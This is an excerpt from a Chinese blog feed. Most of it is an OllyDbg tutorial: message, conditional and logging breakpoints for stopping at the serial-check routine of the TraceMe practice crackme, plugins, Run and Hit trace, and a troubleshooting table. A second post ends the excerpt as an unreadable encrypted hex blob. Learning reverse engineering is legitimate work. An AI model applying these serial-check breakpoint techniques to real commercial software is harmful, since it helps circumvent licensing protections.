<li><p>将TraceMe.exe程序拖进OllyDbg → 点击<strong>W</strong>或输入<code>Alt+W</code>打开“窗口”（实时显示窗口上相关信息包括按钮、文本输入框的相关信息的重要参数） → 右键刷新，无任何内容，因为窗口还没有被创建；</p>
<p><img data-src="https://i.loli.net/2021/08/21/8WQBH5EFrLjfuPv.png" alt="4.png"> </p>
</li>
<li><p>F9运行，出现窗口 → 打开“窗口” → 右键刷新；</p>
<p><img data-src="https://i.loli.net/2021/08/21/t2URLcf1aFY7q8u.png" alt="5.png"></p>
</li>
<li><p>对“Check”按钮下断点，即当单击该按钮时程序中断。在“Check”条目上单击右键 → 在“ClassProc”上设置消息断点 → 选择消息类型。有文本控件、按钮、鼠标等类型的消息。如果选择第 1 项“Any Message“，将拦截所有消息。我们在这里关注的消息属于“Button”（按钮）这一项，当单击按钮并松开时，会发送“WM_LBUTTONUP“这个消息。单击下拉菜单，选择“202  WM_LBUMTONUP”选项，再单击“OK”按钮，消息断点就设置好了。</p>
<p><img data-src="https://i.loli.net/2021/08/20/37tQXKnsN5FYzJI.png" alt="6.png"></p>
</li>
<li><p>输入用户名、序列号后消息断点将程序断在系统领空，但是按<code>Ctrl+F9</code>（运行到<code>ret</code>）或<code>Alt+F9</code>（返回到程序领空）或<code>F9</code>都不管用，则需要设置<mark class="label danger">段断点</mark>（<mark class="label default">在访问上设置中断</mark>，一次性断点）来让程序返回到程序领空并断下来。</p>
<p><img data-src="https://i.loli.net/2021/08/20/nWeoHv8ctbjkzw7.png" alt="7.png"></p>
</li>
<li><p>点击运行<code>/F9</code>，程序断在程序领空。</p>
<p><img data-src="https://i.loli.net/2021/08/20/nAedLriyp16FNwg.png" alt="8.png"></p>
</li>
</ol>
<h4 id="3-6-条件断点"><a href="#3-6-条件断点" class="headerlink" title="3.6 条件断点"></a>3.6 条件断点</h4><p>条件断点会在满足一定条件时才会中断，这类断点称为条件断点。OllyDbg的条件断点可以按<mark class="label info">寄存器</mark><mark class="label warning">存储器</mark><mark class="label default">消息</mark>等设断。条件断点是一个带有条件表达式的普通INT 3断点。当调试器遇到这类断点时，断点将计算表达式的值，如果结果非零或者表达式有效，则断点生效（暂停被调试程序）。</p>
<div class="note success"><p>如循环、数组等场景中使用起来分析很方便。</p>
</div>



<p>（1）按寄存器条件中断</p>
<ul>
<li>快捷键：<mark class="label info">Shift+F2</mark></li>
<li>CmdBar：<mark class="label warning">bp 0x40XXXXXX EAX==？？</mark></li>
</ul>
<p>（2）按存储器条件中断</p>
<p>在实际应用中程序可能会成百上千次调用<code>CreateFileA</code>函数，因此让OllyDbg在<code>CreateFileA</code>函数打开所需文件时中断就显得十分有必要了。CreateFile函数的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	LPCTSTR lpFileName,                         <span class="comment">//指向文件名的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwDesiredAccess,                      <span class="comment">//访问模式</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwShareMode,                          <span class="comment">//共享模式</span></span></span></span><br><span class="line"><span class="function"><span class="params">	LPSECURITY_ATTRIBUTES lpSecurityAttributesr <span class="comment">//指向安全属性的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwCreationDistribution,               <span class="comment">//如何创建文件</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwFlagsAndAttributes,                 <span class="comment">//文件属性</span></span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE hTemplateFile                        <span class="comment">//用于复制文件句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/08/22/FwNKZrcsze9y5kA.png" alt="9.png"></p>
<h4 id="3-7-条件记录断点"><a href="#3-7-条件记录断点" class="headerlink" title="3.7 条件记录断点"></a>3.7 条件记录断点</h4><p>条件记录断点除了具有条件断点的作用，还能<strong>记录断点处函数表达式或参数的值</strong>。也可以设置通过断点的次数，每次符合暂停条件时，计数器的值都将减1。</p>
<p>快捷键：<mark class="label warning">Shift+F4</mark></p>
<p><img data-src="https://i.loli.net/2021/08/22/J1jn2ZT7Rs4Yumx.png" alt="10.png"></p>
<ul>
<li>①在“Condition：（条件）域中输入要设置的条件表达式。如<code>[STRING [esp+4]]==&quot;c:\\1212.txt&quot;</code>。</li>
<li>②在“Explanation”（说明）域中设置一个名称（自定义）。</li>
<li>③“Expression”（表达式）域中是要记录的内容的条件，<strong>只能设置1个表达式</strong>，例如要记录EAX的值，可以输入“EAX”。</li>
<li>④在“Decode value of expression as”（解码表达式的值）下拉列表中可以对记录的数据进行分析。例如，在条件记录窗口中，如果“Expression”域中填写的是 “【esp+4】”，则要在该下拉列表中选择“Pointer to ASCII String”（指向ASCII字符串的指针）选项，才能得到正确的结果，其功能相当于“STRING”前缀。</li>
<li>⑤对这3个域，可以根据需要设置“Never”（从不）、“On condition”（按条件）或“Always”（永远）。<ul>
<li>“Pause program”（暂停程序）域用于设置OllyDbg遇到断点时是否中断。</li>
<li>“Log value of expression”（记录表达式的值）域用于设置遇到断点时是否记录表达式的值。</li>
<li>“Log function arguments”（记录函数参数）域用于设置遇到断点时是否记录函数的参数。</li>
</ul>
</li>
<li>⑥通过断点的次数。</li>
<li>⑦条件记录断点允许向插件传递1个或多个命令。当应用程序因条件断点暂停，并且断点中包含传递给插件的命令时，都会调用回调函数<code>ODBG_Plugincmd(int reason，t_reg *registers,char *cmd)</code>。例如，当程序暂停时，传送命令<code>d esp</code>给CmdBar插件，只要在如图⑦窗口的文本框中输入<code>.d esp</code>（注意，命令前有一个点字符 <code>.</code>），当条件断点断下时，就会执行“desp”命令。这时，我们就可以在数据窗口中看到ESP地址处的数据了。</li>
<li>⑧设置好条件记录断点，单击实例Conditional_bp的“OpenTest”按钮，运行后，OllyDbg会在“Logdata”窗口（快捷键<code>Alt+L</code>）记录数据，如图⑧所示。</li>
</ul>
<h3 id="4-插件"><a href="#4-插件" class="headerlink" title="4 插件"></a>4 插件</h3><p>将插件复制到Plugin这个目录下，重新运行OllyDbg，就可以加载插件了。由于0llyDbg默认只能加载32个插件，而且插件之间有可能存在冲突，建议在插件目录下仅放置常用的插件，以减少各类问题的出现。</p>
<p>常用插件：</p>
<ul>
<li>命令行插件CmdBar如下图。</li>
<li>OllyScript插件：OllyDbg的脚本插件可以通过OllyScript脚本完成一些复杂的或重复性的操作，具体使用方法可参考其帮助文档。</li>
</ul>
<p><img data-src="https://i.loli.net/2021/08/23/HnkhF3DNGpL1CK7.png" alt="11.png"></p>
<h3 id="5-Run-trace"><a href="#5-Run-trace" class="headerlink" title="5 Run trace"></a>5 Run trace</h3><p>Run trace （Run跟踪）可以把<mark class="label primary">被调试程序执行过的指令保存下来</mark>，以便了解以前发生的事件。该功能将地址、寄存器的内容、消息等记录到Run trace缓冲区中。</p>
<p>-待补充-</p>
<h3 id="6-Hit-trace"><a href="#6-Hit-trace" class="headerlink" title="6 Hit trace"></a>6 Hit trace</h3><p>Hit trace能够让调试者<mark class="label success">辨别</mark><mark class="label warning">哪一部分代码被执行了，</mark><mark class="label default">哪一部分没有。</mark></p>
<p><strong>原理</strong>：在选中区域的每一条命令处设置一个INT 3断点，当中断发生时，OllyDbg便把它去除。<strong>在使用Hit trace时，不能在数据中设置断点，否则程序可能会崩溃</strong>。如下图。</p>
<p><strong>使用方法</strong>：当遇到一段跳转分支比较多的代码，需要了解程序的执行线路时，可以使用Hit trace。</p>
<ul>
<li>选中这段代码 → 单击右键快捷菜单中的“Hit trace”（Hit 跟踪）→ “Add selection”（添加选择部分）命令，将需要监视的代码选中 → 然后按“F9”键让程序运行，OllyDbg就会在已被执行的指令前用不同的颜色添加标记。</li>
<li>注意：如果右键快捷菜单中没有Hit trace的相关命令，则必须打开相关的菜单选项进行代码分析。例如，可以按“Ctrl+A”快捷键或执行右键快捷菜单中的“Analysis”一“Analyse code”（“分析”十“分析代码”）命令重新分析代码。</li>
</ul>
<h3 id="7-Ollydbg常见问题"><a href="#7-Ollydbg常见问题" class="headerlink" title="7 Ollydbg常见问题"></a>7 Ollydbg常见问题</h3><table>
<thead>
<tr>
<th align="center">常见问题</th>
<th align="left">快捷键</th>
<th align="left">原因分析及解决方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>乱码问题</strong></td>
<td align="left">◡̈⃝： Ctrl+A<br />◡̈⃝： “Analysis” → “Analyse code”（“分析” → “分析代码”）<br />◡̈⃝：“Analysis” → “Remove analysis from module”（“分析” → “从模块中删除分析”）</td>
<td align="left"><strong>原因</strong>：这是因为OllyDbg将这段代码当成了数据，没有进行反汇编识别。<br /><strong>解决方法</strong>：此时，只要执行0llyDbg右键快捷菜单中的“Analysis” → “Analyse code”（“分析” → “分析代码”）命令或按“Ctrl+A”快捷键，强迫OllyDbg重新分析代码即可。如果还是无法识别，可以尝试执行右键快捷菜单中的“Analysis” → “Remove analysis from module”（“分析” → “从模块中删除分析”）命令或在UDD目录中删除相应的UDD文件。</td>
</tr>
<tr>
<td align="center"><strong>快速回到当前程序领空</strong></td>
<td align="left">◡̈⃝：双击寄存器面板中的EIP<br />◡̈⃝：单击如下按钮。<img data-src="https://i.loli.net/2021/08/23/3s7wcCalLW4gih5.png" alt="12"></td>
<td align="left"><strong>原因</strong>：在OllyDbg中查看代码时可能会翻页或者定位到其他地方。<br /><strong>解决方法</strong>：如果想快速回到当前CPU所在的指令处，可以双击寄存器面板中的EIP或单击<strong>C</strong>按钮。</td>
</tr>
<tr>
<td align="center">OllyDbg修改EIP</td>
<td align="left">◡̈⃝：Ctrl+*<br />◡̈⃝：右键 → “New origin here”（在此处新建EIP）</td>
<td align="left"><strong>原因</strong>：修改EIP。<br /><strong>解决方法</strong>：将光标移到需要修改的地址上，执行右键快捷菜单中的“New origin here”（在此处新建EIP）命令或使用快捷键<code>Ctrl+*</code>即可修改EIP。</td>
</tr>
<tr>
<td align="center">UDD</td>
<td align="left">◡̈⃝：查看程序目录udd文件夹</td>
<td align="left"><strong>原因</strong>：清除调试痕迹。<br /><strong>解决方法</strong>：OllyDbg把所有与程序或模块相关的信息保存在单独的文件中，以便在模块重新加载时继续使用。这些信息包括标签、注释、断点、监视、分析数据、条件等。</td>
</tr>
<tr>
<td align="center">已经删除了断点，llyDbg重新加载时这些断点重新出现</td>
<td align="left">◡̈⃝：修改<code>ollydbg.ini</code></td>
<td align="left">将配置文件<code>ollydbg.ini</code>中的相应内容改成<code>Backup UDD files=1</code>即可解决。</td>
</tr>
<tr>
<td align="center">OllyDbg出现“假死”现象</td>
<td align="left">◡̈⃝：修改<code>ollydbg.ini</code></td>
<td align="left">用OllyDbg调试一些加壳程序，程序运行到断点（包括硬件断点）时，OllyDbg会出现“假死”现象。解决方法是：打开配置文件<code>ollydbg.ini</code>，如果<code>Restore windows</code>是一个很大的值，就设置<code>Restore windows 0</code>。</td>
</tr>
<tr>
<td align="center">微调窗口显示</td>
<td align="left">◡̈⃝：Crl+↑<br />◡̈⃝：Ctrl+↓</td>
<td align="left">可以通过“Crl+↑”或“Ctrl+↓”快捷键对反汇编窗口或数据窗口翻动1字节。</td>
</tr>
<tr>
<td align="center">执行复制到可执行文件时，提示错误信息“Unable to locate data in executable file”</td>
<td align="left">◡̈⃝：修改<code>RawSize =VirtualSize</code></td>
<td align="left">这里要修改的地方不在RawSize范围内。修改PE文件，使“RawSize &#x3D;VirtualSize”，具体方法参见第11章。<br />或者添加的代码所在区段属性不是<code>CODE/TEXT</code></td>
</tr>
<tr>
<td align="center">把call调用改成函数名的形式</td>
<td align="left">◡̈⃝：Shift+;</td>
<td align="left">例如<code>call 401496</code>，假设<code>401496h</code>处是<code>amsg_exit</code>函数，将光标停在该处，按<code>Shift+;</code>快捷键，会弹出一个标签框，在其中输入字符<code>amsg_exit</code>，所有调用<code>401496h</code>处的call指令都会变成<code>call &lt;amsg_exit&gt;</code>的形式。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++ 语言内存管理</title>
    <url>/post/memory-management/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ce3c8b26bcd30b2c08cc0b8ba2507963ff38d48d8e0db0f6a76c629f04faa47e">cf7aa5ef87a7f612bc8f789c7555c6c84217ae93dba97240b10fe0241c45cb3d3f5207128a1b0e97f1f253f552c43694cbd5b56e4d2ca440847fcb67af38fb7a26a6927bb32586df2fb4569d773b189d863fc08a88291d5afcaac142f4d12f40ebc240ba48b4e6ed925a4733982ec9db661750698e3d350aafbceebf4995da01ec65b05e60ec97350f807beb5d644e9eb95d5aadafa2dccca5ac7877bb08ee00564d5e5ab435035bf6cd69085b63e86562818bf77a43de700d452758da0b2980a566b0366a1ed7d9133c04a7bcf0defb350094c22bd18f89050e6362ca5e996a4825f4f3002717802adcb63d9b65d180c0cfebcbfc6d52f4d9b37e050cb5ca74af836d1057242c7c4f614c862486ce85895e5794f682e50c29365499ded882821b60530a9c8b62f87c8639947dcdf9226b17e42c7f80dfc840da939c5b9c5d260905757de75f92ca08ac94059a05a35f279b849965dfa37dabdc31cdc0483a79825123c9833ffcf0b4cbfbcc04cdf11aa267bcc9648a9f05c75523439b56ddd4dd2d57f9ae0e48706460e65838c8cafc8325b4011b3fbcf43b9078534a0de32374eba4dc3bccb551edb93f21037f6a17e319a128294686a8e64c5b8c8bf761ee52900034b65fb36681141d978bdb5c0a7bfa90860c6fbc47d0a292e9637ec31f24ae22d5de1d65265833b33eced38e388e978bb2f180ac550f84b0dfa0301a60423c539c0aaec4ca4e695dc819be7b75b7bcca96547a8403e1c89aab6cacf51ad094f0f853118f81bbb4daf84a25276b01081d6f1a43fea90474e45dc25f6936414836fa60b0d2eb4792b0d7457bcea4b922acfee4d767f0d6ec102cb63c0c3f8cf51a415e305578eee2c1f03d39496425dac9a8aa17197431f828d4263d3c0f834eb9e4cc226a84697f6c35644c33849877eefef87b24bc26414fb7b718880ff6348a7f9ab8bbdf7879b53eefe873a25d23fb8294e0a613b0fc025ca87ff818526a255f35a03d80b1654bdce04e93e3cc8335c0ad9a43282566bd0625e4aa581308d378ae6c4d51a40078706c6ac062e2ee4253817eddf6dd4b75a5e62e03e09ef9e539bc8335e6b2014e69065b739c13c9c3479ea63d6af21d4c0ae75b8337369269ad543fa80b7a5fef89f61334db83cd4d524105fc7531c6a41e2b40debb8dbb996a5ae2a0b629bb1263392df42735a91742bd516b0c06a203c4b7c23298a7eca93cf41d1ef081fd0a44868828eee9e1c669a32d95b0eae963d943229b849868396a4c12d117fdf17d32b5513c78eb401b201f177aac43add4f6171ef8d980542bc9e605689f5788189a858996ce60b3407fcbe2eee5e09ff6c26ecd8b94db27a1e2c96713419c6d8a480e4a403678c81c8c7145e579a3f3b5bc25a6ac2f400af5c29c090ff5a1529bac4613304be0cc301ee271589bb6d5c60c293c4f51129edb497478ead277d39d7350f0459a09e880d669acf529c2c65eae8ae7e00f287f7f00f010b94c2609d6c667c942693226624b0526cbbd3b9507346e29b4d6a5d809cf8771577ecdb1bc34d8f5725568d38a3f256891ac3fded0087a2776232b45f1db0c4fa1efa7d53501020f02aaac61179c7ef4c7da7a6468c6edbad83a8419bb83919ff23cad62cea694f32b9e251b625a04055c4c7e4941f74d1a14383c2ad223a665d52d7cc4c8fb82eb3380d9d8aa8a14087465507a225b78298dfd78d69e9136743a292543d21587ac44f00f89a1af9fc29a7f5d3ca2377e2e85d0b05e9c51bc4ac999f02bf5822abecfcb9e8b5ecdf17af6076c1f2ced3351574b086abaa9659284c155f9ee141f980ef926c422f5207ebdda62907a708d4466cfffd82100fe77253e9fcd836f88c23f6c8d9be1700c1ac2d3355e9a1e52deecba09145783a97adb8a001eb1cbf47a015e74301c0206dca196f1a8f0b5c784cdd0bd79229491c70504dcbc3ac5c58834030e1982005aa03a190999d8a416fd60f2d229a919672b1ff51db23dd84b0933480af66bbbbcf937b71eece0910ae9e11948fc35de294ce5cbaf47db9837f32e19c89f1005c486bf44f0eb1182417031c41d273081eb647220e76d0cb509b914da98a8ac298966736e88ccb76b5a57ccaada02c337b60b97cc1c870f8681923d7ace5a9d6dbc1d29e3e45ae32a54fd392ecea621ba7e0d90b20ec40603e40356def62a24b56d2c89010ca969637aeb3e4d7bf7dfeca424b9f3c7621b722addd6436b9a6d7d885656da370d50c36f52f692b855f838678dc2c033406cbd97fa167094925a86d8c40b0e27c186eb6cb41310a8a36dfc9876a5346c91f4d23f44535b421aa1b864bb9924cb536ab31ca596ee5544fcb1793ad2c0b0cd4c3b6771f4e709975ceea8e7ebf253ce4d4466b19d0d7da7a341b36bc2e32dd896c529b9e572a12924579506db1bdda8cc8ec8b0f4e055edec27cb2d21a3d34bb98898e337b1fe433cf3d5a9527777e224eeb14027121c653df3453b9f8512dd8876200270f43a2740bac94589be6e9a953fab5e8236d1f912f82f77377a5fc6a708be0586478473fc5af067314edfc76a9d406ee883098799cd8231b88104dd43e28127ed3d00e79bfb82197388b90bb96f5785302632fcce3fa150d812b88d25b0f1645ec3c5d908d9ac950d1ebc827340772f81d224e0b41be01aefafc8b700cfb41161d166f0331a0ce4d76415fc70d0c6ea4624e9fa4f5e8c4eb8a780fa0e1727181a636da281da0833d26dbad3d7d420df4070bd490d29f698c8297074d1170b9d1a65755f69665e1f82c5694c27ee7400f612081872b0534bb9ec2f0a555c7d5f6dee9ea0f457770210374483c2996c9806dff6b023d9230983b964aabd85e04341a1c9612dcc001e9bd4342c28bb6e4de3314155710e5aa14c5e01e64b6bc917922cc61453661906b03f13f7961c4ce4b8ce6949f6af6db9686dc76d0e833eae1e51d30702e7f333f0b975664cb118455471593a24e4878e53fc8ef329a9a83a29d6d1f6b0fbfcfd7effd43e9e47856815f73541d3e6f98cdeeb81f9bf4ed8f1b986067ea9cf94d14a86d3d7e0b45b18e5116f25ca5ab76275a542692a2505634bfe7392a28ae9b1a30753327b68a555de4bf816191deba559e43cb718c4ab7c2de02374cbd12d018cec0398915afab00988c263906260cf82c58415a8490ab5a5aeec71e30c144a01f23ec22f04e34bf5212696d9192c31b66a664039b0f87980c47a0cb1c402f203460db2148daa2797ece3a94808ec8d4b32a8bd8d43006a9fc8277103ffdad9e4662f302d9de8caf41ab0ac2c7b738728ddb314f4a01263307d3cd00d58d2e0a1e454b246a242edc0f4005fcce970759f20830b9a3359023169d9ef38008f60926e4c224a9b92cae75a354a936bc303cf26b873d553440b5dbf30fac4b34bef6108e5b34a6d18c6d3c5c1300d1a9ded1f9123561dd415ec361a62a5357609da842c3166471769513656de8fc320f95a7eb4df39a4f1d0020165a577d6413132153602374558e97d2449f0cec174e86ba23e2257166a22a4bed6d75928a0b73d64b2e24cd22c4432e24b42e002b181dbaea3650f5b434ca5f1b029263b2762dbaa9abaef9c32a5c23ac44818b1420132a441dc363b99f71cd164fb7cea91c5f79c5a9a41ba7fb6660cf6d48e7442d174f51178fcf21f2cc8efb9c9134ce4d44feeb3af6103ba7aa28fbd514dd35ad09d5c3ad1cd544449b2636e2ea4fab1cfa03007848575a93e364f2286a5725b273aacd7507dca024e40d0c32a2fe646dc9b3667cd6dea12352d8289435710668de6b590cd3583d2822e961eae10586479873e804fc924584b7a5c7eced1ed204da13e319981b0f1d158225e78fcf52af6da558ec8e6088ede69ce7de8665db371c6ba78dc2b8de0ccb9023125c5fda7fc18a5dece234583d70fcb5624d2b5fef65a91d75002a42f0fd048a2289ff5f81dbea1e9fd9c838b6457af16c83f6d9a1b02d696508325a83bd01eca8e8f59fb0e5f7f3aaa747d3ed3b6af1bcacd2159c5114de83fdd0c3237f1aba4c781e9e10793518d014da437f0fceb366b5ae2b48f65ed16987815a772e38372d68541c67eecf7b0bc81edf829b5925e686ad745c5608c8c223e224bbcaada44ce8a0fd0480ae441eda086fb064c79c172f8309be72cdebe6c135bd3fbc70c1c7410073b16194326bd68a0b16f7820a551ea1a9ae91a12e5339cd24c142ef2170225ea704119f617e724c34d6d0c6e870a55504dd1a111130b444e3750adcf950c4660c70e539149d4cfe5d2df1b48c7b0fe003fc44683a723c031d349eeefafe70548cbbae328618e25d3ebaab83e9a14a37ff2571ba2d6baa6c61b8b81b2c8f24badde17cc1a3d66b6f5bef91ea5368fa7a987ec242277c2b8bd847ef9e08984bcedea60c8cc5da7885dc3e914b9d52bf64ed53346811570e35747f643a083ce546ee95ec87d7675a888bb786cbe8fa9ffd5866c1dcea42405b3243227279a10bfa7a1b14cdbf900e9af62dadfd00ee2d2c2a2ae591a64b3c279c32204f886a069cfa2c197bb915eb7ef1ad6fbb14e5f75f1c0d4ba83f13483de15b73fb072ddcbacfb47b2c98f096ad80404e6f2968e525a858cd603bb53bcfb28b2f6ed6744dd425b2a79c20f572e104d562cb7371f90e9800c0d64fb58dd1b86cacb48d844039a9d0a4f57f9a3e3709e475953672bf3cc7b30510bc1fc1f58778eb5f11f8976c076b94251f91bf4b5c62bad80897797ba9e08f955fbb8686543f66763e2de8bc6a40856c68ffef5260a4b96630204fdb0efe962e2985f452518be555f26ecb7685692ba3985064f20197f93da03672f139e6caeff9f201402ddeee5852eeba1d245022e460367b51cef8fa633e265201a5570a047ba500e460277b84330a0e5db0b973a3709a1343d95011ee8bc3aa495a6f6343846eb100df489b046a9a86f52963b72a29a39b669abdb43296275f03f049c2c31ff0d757bb3583a175cc9be735ccdbd30fc458e6ce7d63ceeee6b62d021ec1bfae9f20d481d4d76f2151a4f04d3082d09f55ba3896e1d3af4e9c200fa2facbc8ddcb8c3b2c6fd1ef3daf517547dffb67632c63c9689baee690e9d9eba738f4acb5251d4d40b78d894d1e9c44e11ff1ed8087992b13b63e87f1496e8418b6f66dabc8db719663ebdb4220b4f1da58e4a8d8a65eaca1b526c78c780a3294d22b6221a0b5601d5f6ae024b3e2931698a81a15df14d805342d9956958172f8a99c9afcd03dd2cee9fc166bf6cbfc46ce74c6cd00271f5b8ba8e18ca6a6ef7e4b5432dfcc229704a360b07b6951dad318dcb51e63d01c163619075def84ea6283d19ca791fdf1964cefd949b990ba19d39b0cf289684936662b4344a1e64819e45bb2faab02888097d4fd0e5b21910dee7f7bde7e5e0fdec6addf846917f677e910d9adf1aa48115a74bb02a7635313a7686df440e655e53f0090e06488b76b93ec44b950d98d5f6270e29ac691ac5aa6f881dd8f7a70ec6f410c44962b0df68b0743ab6cd33b7f94d551566ab292ca2f35e931c58e9fbe2ac42bd83f5bb4fca7d900d82e0dbcfc34c3a31ca1fc0b64c82764a4837a81ed2abf19ea14f80fab8317c8118cb061d7a5557cc1a4409f4089cecfb8743721083c60f879e06ab6aab33dca69e5fe1163a5e4b2de4660a2250bb11aca8f798cef1ccfe8d110e4da292c45d39b9d23d4b3e3001e8a1a018cedcd3e7205fb4867d1ad5ce99c69887f773e4b7844e0d04c00c547e0f04d58d54bc3e4757193a5f04d8e4c9ae17d9259e302eb82e5b889283fefb645d261355f8c9e287fbdc5b40166375ec3454b740d32ff864f5c80be87b67be632a3741587394bb1c980e4642fc429811506ffb6b5e53d8dc1c202ee5e4929cce94846c650ebecffa9955472138fb08844b93df9c9dc58e3e84864d33f322208fa790178fe7b25180ed2efa8b2f8ac66c51deb0be8daa1460a57fe0f98ad140949516d9eed1ddf53109487742a1d96bdd4733845d5cf8eaef9da17ab2f360084d8e0dbe1ac23cf083c5353292a96673b87a9c570a94dd9616ffc34c52f186aef5db8fb1c8c2b370eee3cd4fc29316d871801fb661721f6ed56a846217245cc7363c58251a3c68a9c5bcb8fd23313b7b530813303fca162e666f627a18b1b82d934e32e2ae431d496db45a8b4d5cca16ea123f3f86998c808ecc288b7475edbe7d9d44a9483348a6ea0cfd989e348967c76ff1decd319996c2ed78cfe971af11542c55b334506122ebef4fdb9692e1e387176acc393906cb39e7e47969ebf2cc661244b463915b55d64b452642d32282ec6c3db4c837298d65a7365eaf2a2651cc63cd4fb20befd253d703261b3eeedb0a479ecaf52e7f799051e455d854ccca5f51422b3b2fb1b5590c76da0da7ebcbca667fbf030481e1f1716d0c555537e3b3d0f0b9706f31373e79b16ac5e41609612fb191ea6743d804d1b9713d2308d7061adbcfc8c5444f5e50d5d880318293919526acf92931f6793b21cace945ac1fdc53a45ab2fc9c9762d66eb165526fb1415bd4b36769eb74015fb03d809440eeba6fb003c40efb15ef86e64934d8b1359c9e0987ce70e10c19cb0ca28372377a9a37df8e6fc130fa9ea564bdd150e4f4aa0194d6f04c15ffbd731edbc43556a1b12a53ed0b918eb0e9b4623cdf42d4204700d55d9a930ef21f37d159fb6237b03935a8b13899fbc57681f1f0a0ba5e9d953c57fcd220d9833f36314b4831d172032990a0016cae35b4cc9a42615962fdbedc9b4de57b206dd6ca3baef01d0ade05ef8cabd03ab49160d72e6923878eba0f1e0c978e6cae2d0b98b8b2a330ef9e506b2a597f36a96d3f8c5978f92e607bd3b5a886e040bb14a7873cc972a12b1c986a0876ebc2139b833ff35bca79f8ececcd0368077063893b260e4a551b5fad800a8a7680e520ffdd694adef08272649c9814263ce1634401f684587e90f924789b57190c86ba584205afe969d4b31a1bf76de4624eb5cd07c15d6f20b7c768bd16f3b368d2834d6389d986dde17d991c49c73218653d3a46af0737e0095630ade5e0f2bc91a46adb3e9953f288a5d0ad0c650b8efc80f39405b0cb99d2d2867f1ad5fa21d7fb81ff65410448fd5f40a18a0e12f9b5e001935377ad159e931ad8cfe50631ec322fc3ee47d24505859b88172ba81aa3ea71919e140a538851e17198f6be2c4924e51510c962d8ceff57dbc1d39c4acac07ed781b1d6f60beab2c46c13c7faa9bb46d904ecbd38087516676ee510b7fe3b96236136a5d5ef50df863e8f04ad1ec24ff3ad3ba726ad5f4a4e0af89d8ed589b6eec239958733b9e069e4277ddadba423a70e73f33adf2f59d02b48df757472b28c411832b5cf0e291b360f47d4d451e417b2c772f0e8b1c64f83ff07163e4bbd667829d80f201e121349a09f08697a08de0e09d06bdce45b41983ac3b1438b795f9a40477664fb0167813f4d60483c9750d92c569283d10ca0983e6fa1c946595a6e56fce449e484a9f48dd3d60d5722cd388ec3e45dc22d588eaa54144264a236de0cf4adfff66d3283085cb392f28fb1df9a207620e2d56acfff2d8f041bf3924e0dfb4ff332f0946ddcd405f82ba5e7526e19222c504628fb26058c151a8996261424682a87ed427aa55f63249e7ec3f537c9864eb025fdc542823f9324460bd216e3e59d48c1a4254f9118ecb80a1444d2019b8f4897618c0b2dc9199d4bca01b68f84971959f1883df3271073dc55f7489d616a3567148a20e442988ee40ef9dee38bade7d7f62041f217c203cbaee7596517de97df5cc0771ff7d675a0e9b9347daf1511a1e030a03c8d8e5ca2d6b9bc733acd208a0d0669d8746aebbdcce88c69063820ddd994c8730bd30d9a137b0df380bd1ba49ca760a9959e7e817a12b21cc4ed4dfa8eb8d90ee47d790920d9606ede72912a298a647b4b27bfa97ec740be91bf331e44ce30710e47da57341dd061d12138f3fc195152be6679f61fa975bd046e7e22e6b5dc61b657c46595b0ce18d21127f6b87b2ee59678658b0dda7d4ee456861466dece29c57027db9dde707a63c0a59b8db13ee73c468efad48650a4ff3a4e43700a49e4ed9df1103f8c24fe6e38c6a0334043b94963301362fc2e96ec5dbe60a6da990334dcfcadfae0abd7879e1cfc962b9ca5d12eed1c73daacc165d370f110344998733a7d133d828e3c54324f4b7a0f1e97e77ba38dd45969994c5c1b1366edf801b701fae1fdb60a01074f4fdc561beae06c4b5f23733326966a3f482278595405676f4191b1f271b013f9b46ef80fca7cb3fbaaf28910b72f77e5cedf2425b6e8e7a647728c8c1b306ffd5b679c192dbd83b709c4d601c045e3f5df8103f32c47a74cb9790119c7980d897fa908689c2ace0d9a47f6d6cc872abb39437ee467a067133df73b3f18a6565ef8d48919d69879cd05e8b9b4992a2434bd2ef504ec9a91dd00e3d3aedde71a73a998dd5d7d5efb383861bc3f9c5313f68824274e91828c2b0ca8797fc996dcb81f0128ffba374ae4f89b24e76f12e50d40972dafe246ccd6c5353925ec13a764dc5aca15efaf9d2b1b238c3348f7e79821031bf130248625f9bd2e54d11fd807db2fc2952c498dcb288f939d77e52a647a51f1337af6e557cbb91245fadd57950e0ddb90e423c7a27dffc2dbbc7e9905ffed2001132302cfce3a998f202087c9b0c34b66b422187a862dcda99b7b2c6b4c85e3db19b94f14f3460dbb5ae7711bb066a7e508df5d2ee108f1361550cc690d7e56cef238122f6f05c73e8d524d42d2a3d7898a79419e12ec533334aaad06a150009bb5a6dbe66adce39af48d2a3ada8fe21665328ef84042f9f5ae075961b43f2a437198472ff952a864ba05e7ea8931112b51d17d58bf26bd382a40093020955ce8a92f99b48c4ef9a8a4b3cb0f82ad7d85df91364b5c38a572b0d56a150c5836a9bbc4694182ae7b37d34df6dcddece6b8a64d3bf06bae7589861f20032dcb93a59ac1cd1fb6d903551466609acaa540daec73bc855f3def863d193920b09c18a77b2e5c36a95989cbc1b92b114e9ecce3759f4c70dec1627b280edf865107f365f0addfd4cd134c2e553ef685b49493591f2dff2dc2ec174aa06a274678e01ce4c642868d1b8270deebe3f36e187813e3ececa0b37eaa08b468aa7a67aeb3769b609169c82a4f97df2895a098b0284f22be636b4b51934e11f28ddc0f95dff1a90e19615c66df0ce9aa69f794360ac62567093b6c5a5838b463041c70f701afb47e9996aa1117443c11b2fd366274e7c214598b318ac8ffcb0e0fa227331c6387d58b19f5389532da65227282cc8968d1eb45484285dd19dea23ce374eef03df75fb87e480e6e999b8e51c9e1536ef337989e44e95574a78c609d27d1d9f88